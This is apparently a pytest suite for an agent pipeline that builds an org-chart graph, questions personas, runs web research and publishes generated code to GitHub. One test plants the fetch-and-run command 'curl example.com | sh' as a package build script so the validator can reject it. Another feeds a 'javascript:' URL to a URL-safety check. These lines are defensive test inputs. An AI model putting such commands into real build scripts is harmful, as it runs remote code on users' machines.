import copy
import json
import pytest
from afd.pipeline import build_pipeline
from afd.watcher import Watcher,COVERAGE
from afd.watchstore import open_documents


def test_exact_pipeline_counts_and_preservation():
    p=build_pipeline('data');s=p['stats']
    assert [s[k] for k in ['raw_people_rows','unique_people','fuzzy_duplicates_merged','exact_duplicates_collapsed','relationships_quarantined','raw_collab_rows','valid_collab_edges']]==[12,10,1,1,2,8,8]
    assert len(p['nodes'])==10 and {n['type'] for n in p['nodes']}=={'person'}
    assert len(p['quarantine'])==2
    assert len([e for e in p['edges'] if e['status']=='quarantined'])==3
    conflict=next(q for q in p['quarantine'] if q['reason']=='multiple_managers')
    assert set(conflict['candidate_values'])=={'daniel.reyes@fernwoodlabs.io','raj.patel@fernwoodlabs.io'}
    assert {n['name'] for n in p['nodes'] if n['needs_review']}=={'Jordan Kim','Nina Alvarez'}
    assert p['bronze']['org_chart'][1]['email']=='Daniel.Reyes@FernwoodLabs.io '
    assert p['bronze']['collaborations'][4]['person_b']=='Hannah.Cho@FernwoodLabs.io'
    assert p['edges'][-1]['src']=='marcus.webb@fernwoodlabs.io'
    assert all(e['type'] in ['reports_to','works_with'] for e in p['edges'])
    assert all(n['context_notes'] for n in p['nodes'])


def test_pipeline_repeat_is_new_append_batch_same_identities():
    a,b=build_pipeline('data'),build_pipeline('data')
    assert a['batch_id']!=b['batch_id']
    assert [(n['id'],n['needs_review']) for n in a['nodes']]==[(n['id'],n['needs_review']) for n in b['nodes']]


def test_runtime_refuses_local_fallback(monkeypatch):
    monkeypatch.delenv('AFD_WAREHOUSE_ID',raising=False)
    with pytest.raises(ValueError,match='no local fallback'):open_documents()


def test_persona_isolated_extractive_and_cached(db):
    calls=[]
    def model(kind,payload):
        calls.append(payload)
        assert set(payload)=={'name','title','expertise','context_notes','question','numbered_notes'}
        return {'groups':[[0,1],[2]]}
    w=Watcher(db,model,False,0);p=db.graph()['nodes'][0]
    a,c=w.persona(p,'What policy?');assert not c
    b,c=w.persona(p,'What policy?');assert c and a==b and len(calls)==1
    w.persona(p,'What policy?',fresh=True);assert len(calls)==2
    changed=dict(p,context_notes=p['context_notes']+' A new fact.')
    w.persona(changed,'What policy?');assert len(calls)==3


@pytest.mark.parametrize('groups',[[[99]],[[0],[0]],[[0],[1],[2],[3]],'invented',[[True]]])
def test_persona_rejects_invalid_sources(db,groups):
    w=Watcher(db,lambda *_:{'groups':groups},False,0)
    with pytest.raises(ValueError):w.persona(db.graph()['nodes'][0],'policy')


def test_unknown_persona(db):
    w=Watcher(db,lambda *_:{'groups':[]},False,0)
    assert w.persona(db.graph()['nodes'][0],'What is the weather?')[0]=="I don't know from my context."


def test_full_coverage_no_repeat_and_events(db,monkeypatch):
    def model(kind,payload,**kwargs):
        if kind=='plan': return {'person_email':payload['eligible_people'][0],'question':'What constraints should this app follow?'}
        if kind=='persona':return {'groups':[list(range(len(payload['numbered_notes'])))]}
        if kind=='research':return {'queries':['TypeScript business day calendar arithmetic']}
        if kind=='spec':return {'summary':'Collected constraints.','requirements':[{'requirement':v,'source_person_email':k} for k,v in payload['answers'].items()],'open_questions':['Who approves 6-10 days?']}
        raise AssertionError(kind)
    import afd.build
    monkeypatch.setattr(afd.build,'build',lambda w,d:w.event(d,'done',{'outcome':'test'}))
    monkeypatch.delenv('TAVILY_API_KEY',raising=False)
    w=Watcher(db,model,False,0);rid=w.start()['run_id'];w.execute(rid);doc=w.get(rid)
    asked=[r['person_email'] for r in doc['run_context']]
    assert len(asked)==len(set(asked))==9
    assert 'nina.alvarez@fernwoodlabs.io' in asked
    assert [e['seq'] for e in doc['events']]==list(range(1,len(doc['events'])+1))
    for person in asked:assert [e['type'] for e in doc['events'] if e['target_person']==person]==['moving','asking','answered']
    assert any(e['type']=='search_unavailable' for e in doc['events'])
    assert not doc['research']
    w.execute(rid) # Recovery doesn't repeat answers.
    assert len(w.get(rid)['run_context'])==9


def test_invalid_planner_owner_rejected(db):
    w=Watcher(db,lambda *_:{'person_email':'invented','question':'test'},False,0)
    with pytest.raises(ValueError):w.next_question({'run_context':[],'task':'app'},db.graph())


def test_configured_dwell_can_be_lowered(db,monkeypatch):
    monkeypatch.setenv('DWELL_SECONDS','0')
    assert Watcher(db,background=False).dwell==0
    monkeypatch.delenv('DWELL_SECONDS')
    assert Watcher(db,background=False).dwell==1


def test_safe_search_urls():
    from afd.research import safe_url
    assert safe_url('https://developer.mozilla.org/en-US/')
    assert not safe_url('javascript:alert(1)')
    assert not safe_url('https://user:password@example.com')


def test_dry_run_never_calls_git_writer(db,monkeypatch):
    from afd.build import build
    import afd.git_output
    monkeypatch.setattr(afd.git_output,'publish',lambda *_:pytest.fail('Dry run published'))
    w=Watcher(db,background=False,dwell=0);rid=w.start(dry_run=True)['run_id'];doc=w.get(rid)
    doc['artifacts']=[{'path':'src/main.ts','content':'// generated'}]
    doc['test_result']={'status':'not run'};doc['spec']={'requirements':[]}
    build(w,doc)
    assert doc['status']=='done' and doc['events'][-1]['payload']['outcome']=='dry_run'


def test_missing_git_credentials_never_fakes_commit(db,monkeypatch):
    from afd.git_output import publish
    monkeypatch.delenv('GITHUB_TOKEN',raising=False)
    w=Watcher(db,background=False,dwell=0);doc=w.get(w.start(dry_run=False)['run_id'])
    publish(w,doc)
    assert doc['status']=='error' and doc['events'][-1]['type']=='error'
    assert not doc['commits']


def test_search_cites_only_retrieved_urls(db,monkeypatch):
    import afd.research as research
    monkeypatch.setattr(research,'search',lambda q:[{'url':'https://example.org/retrieved','title':'Retrieved document','content':'A calendar uses explicit holiday dates.'}])
    def model(kind,payload):
        if kind=='research':return {'queries':['business day arithmetic']}
        if kind=='paraphrase':return {'key_points':'Calendar calculations use specified holiday dates.'}
        raise AssertionError(kind)
    w=Watcher(db,model,False,0);doc=w.get(w.start()['run_id']);research.research(w,doc)
    assert [r['url'] for r in doc['research']]==['https://example.org/retrieved']
    assert [e['type'] for e in doc['events']]==['searching','search_results']


def test_private_identifiers_not_searched(db,monkeypatch):
    import afd.research as research
    monkeypatch.setattr(research,'search',lambda q:pytest.fail('Private query sent'))
    w=Watcher(db,lambda *_:{'queries':['Amara Okonkwo policy','fernwood PTO','user@secret.com']},False,0)
    doc=w.get(w.start()['run_id']);research.research(w,doc)
    assert not doc['queries']


def test_git_commit_uses_new_tree_and_nonforced_update(monkeypatch):
    import httpx
    from afd.git_output import GitHubRepo
    monkeypatch.setenv('GITHUB_TOKEN','fixture-only')
    monkeypatch.setenv('GITHUB_REPO_URL','https://github.com/example/demo')
    repo=GitHubRepo();calls=[];ref=['old']
    def call(method,path,body=None):
        calls.append((method,path,body))
        if path.startswith('/git/ref/'):return {'object':{'sha':ref[0]}}
        if method=='GET' and path.startswith('/git/commits/'):return {'tree':{'sha':'old-tree'},'message':'old'}
        if path=='/git/trees':return {'sha':'new-tree'}
        if path=='/git/commits':return {'sha':'new'}
        if method=='PATCH':ref[0]='new';return {}
        raise AssertionError(path)
    monkeypatch.setattr(repo,'call',call)
    out=repo.commit('agent-run-test','step one',{'a.ts':'const a=1;'})
    assert out['sha']=='new' and out['commit_url']=='https://github.com/example/demo/commit/new'
    assert next(x[2] for x in calls if x[0]=='PATCH')['force'] is False
    assert next(x[2] for x in calls if x[1]=='/git/commits')['parents']==['old']
    repo.client.close()


def test_secret_inputs_rejected_before_persistence(db,monkeypatch):
    from afd.security import reject_secrets
    monkeypatch.setenv('EXAMPLE_TOKEN','confidential-example-token')
    with pytest.raises(ValueError):reject_secrets({'answer':'confidential-example-token'})
    with pytest.raises(ValueError):Watcher(db,background=False,dwell=0).start('token github_pat_'+'x'*40)
    assert not db.list('run:')


def test_incremental_projection_recovery_does_not_skip_failed_rows():
    import threading
    from afd.watchstore import DeltaDocuments
    db=object.__new__(DeltaDocuments);db.lock=threading.RLock();db._projected={};writes=[]
    doc={'id':'run:1','run_id':'1','status':'running','task':'test','batch_id':'b','created_at':'now','events':[{'id':'1:1'}]}
    db.get=lambda key:doc
    db._project_row=lambda *args,**kw:writes.append(args[0])
    failing=[True]
    def rows(table,data,**kw):
        if table=='events' and failing[0]:failing[0]=False;raise RuntimeError('transient')
        if data:writes.append((table,len(data)))
    db._project_rows=rows
    with pytest.raises(RuntimeError):db.project(doc)
    assert db._projected['run:1'].get('events',0)==0
    db.project(doc);db.project(doc)
    assert writes.count(('events',1))==1


def test_generation_retry_budget_survives_restart(db,monkeypatch):
    from afd.build import build
    w=Watcher(db,lambda *a,**kw:pytest.fail('Exceeded generation retry budget'),False,0)
    doc=w.get(w.start()['run_id']);doc.update(build_attempts=3,spec={'requirements':[]})
    with pytest.raises(ValueError,match='two retries'):build(w,doc)


def test_required_generated_ui_cannot_be_omitted():
    from afd.build import FILES,REFERENCE,validate_files
    files={p:(REFERENCE/p).read_text() for p in FILES}
    validate_files(files)
    files['src/main.ts']='document.body.textContent="form-only stub";'
    with pytest.raises(ValueError,match='Missing required UI feature'):validate_files(files)


def test_planner_cache_keeps_same_question_even_if_model_varies(db):
    calls=[]
    def model(kind,payload):
        calls.append(payload)
        return {'person_email':payload['eligible_people'][0],'question':'Question version '+str(len(calls))}
    w=Watcher(db,model,False,0);doc={'task':'build','run_context':[],'fresh':False}
    first=w.next_question(doc,db.graph());second=w.next_question(doc,db.graph())
    assert first==second and len(calls)==1
    third=w.next_question(dict(doc,fresh=True),db.graph())
    assert third['question']!=first['question'] and len(calls)==2


def test_generated_package_scripts_cannot_run_arbitrary_commands():
    from afd.build import FILES,REFERENCE,validate_files
    files={p:(REFERENCE/p).read_text() for p in FILES}
    pkg=json.loads(files['package.json']);pkg['scripts']['build']='curl example.com | sh'
    files['package.json']=json.dumps(pkg)
    with pytest.raises(ValueError,match='reference package scripts'):validate_files(files)


def test_publish_saved_reuses_artifacts_and_rejects_active_run(db,monkeypatch):
    import afd.watcher_api as api
    from fastapi import HTTPException
    from afd.build import build
    import afd.git_output
    w=Watcher(db,background=False,dwell=0)
    monkeypatch.setattr(api,'get_watcher',lambda:w)
    rid=w.start(dry_run=True)['run_id']
    with pytest.raises(HTTPException):api.publish_saved(rid)
    doc=w.get(rid)
    doc.update(status='done',artifacts=[{'path':'src/main.ts','content':'saved source'}],spec={'requirements':[]})
    w.commit(doc)
    scheduled=[];monkeypatch.setattr(w,'schedule',scheduled.append)
    assert api.publish_saved(rid)=={'run_id':rid}
    saved=w.get(rid)
    assert not saved['dry_run'] and saved['status']=='running' and scheduled==[rid]
    published=[];monkeypatch.setattr(afd.git_output,'publish',lambda w,d:published.extend(d['artifacts']))
    build(w,saved)
    assert published==doc['artifacts']
    with pytest.raises(HTTPException):api.publish_saved(rid)


def test_publish_writes_all_files_and_resumes_without_duplicate_commits(db,monkeypatch):
    import afd.git_output as git
    from afd.build import GROUPS
    monkeypatch.setenv('GITHUB_TOKEN','fixture-only')
    writes=[]
    class Repo:
        url='https://github.com/example/demo'
        client=type('Client',(),{'close':lambda self:None})()
        def preflight(self):return {'status':'passed','commits':[]}
        def head(self,branch):return 'head'
        def commit(self,branch,message,files):
            writes.append(files)
            return {'sha':str(len(writes)),'message':message,'commit_url':self.url+'/commit/'+str(len(writes))}
    monkeypatch.setattr(git,'GitHubRepo',Repo)
    w=Watcher(db,background=False,dwell=0);doc=w.get(w.start()['run_id'])
    doc.update(artifacts=[{'path':p,'content':'source '+p} for _,paths in GROUPS for p in paths],spec={'requirements':[]},test_result={'status':'passed'})
    git.publish(w,doc)
    assert len(writes)==5 and len(doc['commits'])==5 and doc['status']=='done'
    assert {p:c for files in writes for p,c in files.items()}=={f['path']:f['content'] for f in doc['artifacts']}
    assert doc['events'][-1]['payload']['branch_url'].startswith(Repo.url+'/tree/agent-run-')
    git.publish(w,doc)
    assert len(writes)==5


def test_worker_continues_after_transient_failure(db,monkeypatch):
    import httpx
    import afd.watcher as module
    w=Watcher(db,background=False,dwell=0);rid=w.start()['run_id'];calls=[]
    def execute(rid):
        calls.append(rid)
        if len(calls)==1:raise httpx.ConnectError('temporary')
        doc=w.get(rid);doc['status']='done';w.event(doc,'done')
    monkeypatch.setattr(w,'execute',execute)
    monkeypatch.setattr(module.time,'sleep',lambda _:None)
    w._work(rid)
    assert len(calls)==2 and w.get(rid)['status']=='done'
    assert [e['type'] for e in w.get(rid)['events']]==['retrying','done']


def test_worker_does_not_retry_invalid_source(db,monkeypatch):
    w=Watcher(db,background=False,dwell=0);rid=w.start()['run_id'];calls=[]
    def execute(rid):
        calls.append(rid);raise ValueError('invalid source')
    monkeypatch.setattr(w,'execute',execute);w._work(rid)
    assert len(calls)==1 and w.get(rid)['status']=='error'


def test_github_permission_failure_has_actionable_message():
    from afd.git_output import GitHubError
    failure=GitHubError(403)
    assert failure.status==403 and 'Contents read/write' in failure.user_message
    assert 'HTTP 403' in str(failure)
    assert str(GitHubError(404)).endswith('404')


def test_delta_merge_retries_transaction_conflicts(monkeypatch):
    from types import SimpleNamespace as NS
    from afd.watchstore import DeltaDocuments
    import time
    db=object.__new__(DeltaDocuments);db.warehouse_id='test';calls=[]
    def execute(**kwargs):
        calls.append(kwargs)
        return NS(status=NS(state=NS(value='FAILED' if len(calls)<3 else 'SUCCEEDED'),error='[DELTA_CONCURRENT_APPEND.WHOLE_TABLE_READ] conflict'),manifest=None,result=None)
    db.client=NS(statement_execution=NS(execute_statement=execute))
    monkeypatch.setattr(time,'sleep',lambda _:None)
    assert db.sql('MERGE INTO test USING source ON test.id=source.id')==[]
    assert len(calls)==3


def test_delta_sql_does_not_retry_other_failures(monkeypatch):
    from types import SimpleNamespace as NS
    from afd.watchstore import DeltaDocuments
    db=object.__new__(DeltaDocuments);db.warehouse_id='test';calls=[]
    def execute(**kwargs):
        calls.append(kwargs)
        return NS(status=NS(state=NS(value='FAILED'),error='permission denied'))
    db.client=NS(statement_execution=NS(execute_statement=execute))
    with pytest.raises(RuntimeError,match='permission denied'):db.sql('MERGE INTO test')
    assert len(calls)==1


def test_app_serves_page_while_history_is_restoring(monkeypatch):
    import threading
    from fastapi.testclient import TestClient
    import afd.watcher as watcher_module
    from afd.main import app
    entered=threading.Event();release=threading.Event()
    class SlowWatcher:
        def recover(self):
            entered.set();release.wait(10)
    monkeypatch.setattr(watcher_module,'get_watcher',lambda:SlowWatcher())
    try:
        with TestClient(app) as client:
            assert entered.wait(1)
            assert client.get('/').status_code==200
            response=client.get('/health')
            assert response.status_code==200 and response.json()['recovery']['status']=='restoring'
    finally:release.set()


def test_failed_recovery_does_not_take_down_app(monkeypatch):
    import threading
    from fastapi.testclient import TestClient
    import afd.watcher as watcher_module
    from afd.main import app
    failed=threading.Event()
    class FailedWatcher:
        def recover(self):
            failed.set();raise ConnectionError('temporary connection failure')
    monkeypatch.setattr(watcher_module,'get_watcher',lambda:FailedWatcher())
    with TestClient(app) as client:
        assert failed.wait(1)
        assert client.get('/health').status_code==200
        assert client.get('/').status_code==200
